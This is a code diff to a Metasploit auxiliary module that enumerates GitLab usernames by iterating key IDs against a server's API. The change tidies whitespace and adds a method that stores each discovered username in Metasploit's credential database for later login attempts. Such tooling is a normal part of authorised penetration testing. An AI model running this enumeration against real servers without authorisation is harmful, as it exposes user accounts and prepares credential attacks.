@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
       )
     elsif res && res.code == 401
       fail_with(Failure::NotVulnerable, 'Unable to retrieve Gitlab version...')
-    else 
+    else
       fail_with(Failure::Unknown, 'Unable to retrieve Gitlab version...')
     end
 
@@ -85,10 +85,11 @@ class Metasploit3 < Msf::Auxiliary
           'vars_get'  => { 'key_id' => id }
         )
 
-      if res && res.code == 200 &&  res.body
+      if res && res.code == 200 && res.body
         begin
           user = JSON.parse(res.body)
           print_good("Key-ID: #{id} Username: #{user['username']} Name: #{user['name']}")
+          store_username(user['username'], res)
         rescue JSON::ParserError
           print_error("Key-ID: #{id} - Unexpected response body: #{res.body}")
         end
@@ -99,5 +100,38 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
   end
-end
 
+  def store_username(username, res)
+    # Should the service be 'Gitlab'?
+    service = ssl ? 'https' : 'http'
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: service,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+      proof: res
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: username
+    }
+
+    credential_data.merge!(service_data)
+
+    # Create the Metasploit::Credential::Core object
+    credential_core = create_credential(credential_data)
+
+    # Assemble the options hash for creating the Metasploit::Credential::Login object
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }
+
+    # Merge in the service data and create our Login
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
+  end
+end
